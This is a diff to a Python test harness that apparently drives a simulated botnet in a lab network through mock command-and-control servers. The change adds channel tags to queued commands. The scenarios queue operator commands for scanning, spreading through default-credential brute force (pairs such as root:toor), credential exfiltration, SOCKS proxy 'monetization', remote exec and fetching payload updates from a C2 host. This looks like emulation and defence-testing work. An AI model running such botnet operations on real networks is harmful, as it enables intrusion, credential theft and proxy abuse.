@@ -72,15 +72,24 @@ def log(msg):
 
 _queue_seq = 0
 
-def queue_cmd(cmd, args=""):
-    """Drop a command into the C2 queue (served on next heartbeat)."""
+def queue_cmd(cmd, args="", channel=""):
+    """Drop a command into the C2 queue (served on next heartbeat).
+
+    channel tags the command for one C2 mock ('http' | 'ws' | 'irc'). Untagged
+    commands (channel="") are served by ANY mock (legacy behaviour). The tag
+    matters because the mocks share one /queue dir and serve on every
+    heartbeat — without it, device heartbeats (infected in earlier scenarios)
+    can pop a command queued for the bot on another channel and the command
+    is lost (S7 IRC failure, 2026-08-12).
+    """
     global _queue_seq
     os.makedirs(QUEUE, exist_ok=True)
     _queue_seq += 1
-    fn = os.path.join(QUEUE, f"cmd-{int(time.time()*1000)}-{os.getpid()}-{_queue_seq:04d}.json")
+    prefix = f"{channel}-" if channel else ""
+    fn = os.path.join(QUEUE, f"{prefix}cmd-{int(time.time()*1000)}-{os.getpid()}-{_queue_seq:04d}.json")
     with open(fn, "w") as f:
-        json.dump({"cmd": cmd, "args": args}, f)
-    log(f"QUEUE {cmd} {args}")
+        json.dump({"cmd": cmd, "args": args, "channel": channel}, f)
+    log(f"QUEUE [{channel or 'any'}] {cmd} {args}")
 
 
 # ───────────────────────── evidence helpers ─────────────────────────
@@ -207,8 +216,8 @@ def dev_name(fname):
 def scenario_c2drive(report):
     log("=== S1 c2-drive: operator-driven proliferation ===")
     # 1. scan small subnets quickly (a /24 scan blocks the command loop ~30s+)
-    queue_cmd("scan", "172.29.10.0/28")
-    queue_cmd("scan", "172.29.20.0/28")
+    queue_cmd("scan", "172.29.10.0/28", "http")
+    queue_cmd("scan", "172.29.20.0/28", "http")
 
     # 2. spread per vector — BOTH tiers: modern (should resist) and legacy
     #    (the real-world finding: this is what actually gets pwned).
@@ -249,7 +258,7 @@ def scenario_c2drive(report):
         ("172.29.10.49", 23, "ap-02 telnet root:123456"),
     ]
     for ip, port, label in targets:
-        queue_cmd("spread", f"{ip}:{port}")
+        queue_cmd("spread", f"{ip}:{port}", "http")
 
     # 3. wait for spread + payload execution + heartbeats.
     # Each spread command may run the full brute-force pool; the C2 serves one
@@ -322,7 +331,7 @@ def scenario_c2drive(report):
                f"legacy infected={sorted(legacy_infected)[:8]}" if legacy_infected else "no legacy infected yet")
 
     # cred log exfil
-    queue_cmd("exfil_creds")
+    queue_cmd("exfil_creds", "", "http")
     time.sleep(5)
     ev = read_evidence()
     exfil_hits = grep_evidence(ev, ["no credentials buffered", "exfil_creds"])
@@ -420,8 +429,8 @@ def scenario_monetization(report):
     log("=== S6 monetization: SOCKS5 proxy + relay ===")
     recreate_bot("notnet.conf.c2drive")
     time.sleep(5)
-    queue_cmd("proxy", "on 1080")
-    queue_cmd("relay", "on 1081")
+    queue_cmd("proxy", "on 1080", "http")
+    queue_cmd("relay", "on 1081", "http")
     time.sleep(20)
     ev = read_evidence()
     try:
@@ -453,7 +462,7 @@ def scenario_remaining_parity(report):
     time.sleep(5)
     # The c2-irc mock serves queued commands as PRIVMSG from the authorized
     # nick (mockirc); the bot's irc_read authenticates on 001/250/376/366.
-    queue_cmd("exec", "uname -a")
+    queue_cmd("exec", "uname -a", "irc")
     # Poll — the mock serves on its own recv cadence; a fixed sleep missed
     # the serve when the bot needed a reconnect cycle.
     irc_cmd = []
@@ -491,7 +500,7 @@ def scenario_remaining_parity(report):
     # target (c2 payload server) must see the connection from the BOT's IP.
     recreate_bot("notnet.conf.c2drive")
     time.sleep(5)
-    queue_cmd("proxy", "on 1080")
+    queue_cmd("proxy", "on 1080", "http")
     # Poll for the proxy bind (the command rides a heartbeat; give the loop
     # time) before running the client.
     proxy_bind = []
@@ -534,7 +543,7 @@ def scenario_remaining_parity(report):
     # same bot_tag after the restart.
     recreate_bot("notnet.conf.c2drive")
     time.sleep(5)
-    queue_cmd("spread", "172.29.20.31:22")   # legacy-server-01, root:toor in pool
+    queue_cmd("spread", "172.29.20.31:22", "http")   # legacy-server-01, root:toor in pool
     # Poll for the baseline infection heartbeat (spread rides a heartbeat;
     # SSH brute-force + drop + payload boot take ~30-60s).
     pre_hearts = []
@@ -607,7 +616,7 @@ def scenario_remaining_parity(report):
                 f"payload_sha256={good_sha}\nbot_tag=sim-pin-good\n")
         recreate_bot("generated/notnet.conf.pin")
         time.sleep(5)
-        queue_cmd("update", "http://c2:8443/bot/notnet.pin")
+        queue_cmd("update", "http://c2:8443/bot/notnet.pin", "http")
         time.sleep(12)
         botlog = bot_log_full()
         good_hits = [l for l in botlog.splitlines() if "SHA-256" in l and "verified" in l]
@@ -626,7 +635,7 @@ def scenario_remaining_parity(report):
                 f"payload_sha256={good_sha}\nbot_tag=sim-pin-bad\n")
         recreate_bot("generated/notnet.conf.pinbad")
         time.sleep(5)
-        queue_cmd("update", "http://c2:8443/bot/notnet.bad")
+        queue_cmd("update", "http://c2:8443/bot/notnet.bad", "http")
         time.sleep(12)
         botlog = bot_log_full()
         bad_hits = [l for l in botlog.splitlines() if "SHA-256 mismatch" in l]
@@ -668,7 +677,7 @@ def scenario_defence(report):
         ("172.29.20.12", 445, "winpc-01 SMB EDR"),
         ("172.29.10.12", 80, "cam-01 CVE"),
     ]:
-        queue_cmd("spread", f"{ip}:{port}")
+        queue_cmd("spread", f"{ip}:{port}", "http")
     # The bot serves one command per heartbeat; brute-force pools take time.
     time.sleep(200)
     ev = read_evidence()
